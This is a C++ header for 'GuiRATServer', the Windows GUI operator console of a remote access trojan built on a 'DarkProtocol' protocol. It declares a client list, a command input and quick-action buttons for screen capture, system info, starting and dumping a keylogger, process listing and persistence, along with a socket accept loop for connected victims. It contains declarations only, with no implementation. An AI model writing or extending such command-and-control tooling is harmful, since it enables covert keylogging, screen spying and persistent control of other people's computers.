#pragma once
#include "../shared/protocol.h"
#include <windows.h>
#include <commctrl.h>
#include <vector>
#include <mutex>
#include <thread>
#include <atomic>
#include <string>

#pragma comment(lib, "comctl32.lib")

#define IDC_CLIENT_LIST    1001
#define IDC_LOG            1002
#define IDC_CMD_INPUT      1003
#define IDC_SEND_BTN       1004
#define IDC_BTN_SCREEN     1005
#define IDC_BTN_SYSINFO    1006
#define IDC_BTN_KL_START   1007
#define IDC_BTN_KL_DUMP    1008
#define IDC_BTN_PROCS      1009
#define IDC_BTN_DISCONNECT 1010
#define IDC_BTN_PERSIST    1011

#define WM_NEW_CLIENT     (WM_USER + 1)
#define WM_CLIENT_LEFT    (WM_USER + 2)
#define WM_LOG_MSG        (WM_USER + 3)

struct GuiClient {
    SOCKET      sock;
    std::string hostname;
    std::string ip;
    bool        connected;
};

class GuiRATServer {
public:
    GuiRATServer(HINSTANCE hInst);
    ~GuiRATServer();

    bool Create();
    void Show(int nCmdShow);
    int  MessageLoop();

    LRESULT HandleMessage(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
    HWND    GetCmdInput() const { return m_hCmdInput; }

private:
    void OnCreate(HWND hwnd);
    void OnSize(HWND hwnd);
    void OnCommand(HWND hwnd, WPARAM wParam);
    void OnSendCommand();
    void OnQuickAction(int btnId);
    void OnClientSelected();
    void AcceptLoop();
    void ExecuteCommand(int clientIdx, DarkProtocol::CommandID cmd, const std::string& payload);
    void PostLog(const std::string& msg);
    void AppendToLog(const std::string& text);
    void UpdateStatusBar();
    void RefreshClientListUnsafe();

    HINSTANCE   m_hInst;
    HWND        m_hwnd;
    HWND        m_hClientList;
    HWND        m_hLog;
    HWND        m_hCmdInput;
    HWND        m_hSendBtn;
    HWND        m_hBtnScreen;
    HWND        m_hBtnSysInfo;
    HWND        m_hBtnKLStart;
    HWND        m_hBtnKLDump;
    HWND        m_hBtnProcs;
    HWND        m_hBtnDisconnect;
    HWND        m_hBtnPersist;
    HWND        m_hStatusBar;

    SOCKET                  m_listenSock{ INVALID_SOCKET };
    std::atomic<bool>       m_running{ false };
    std::vector<GuiClient>  m_clients;
    std::mutex              m_clientsMutex;
    std::atomic<bool>       m_cmdInProgress{ false };
    int                     m_selectedClient{ -1 };
    uint16_t                m_port{ DarkProtocol::PORT };
};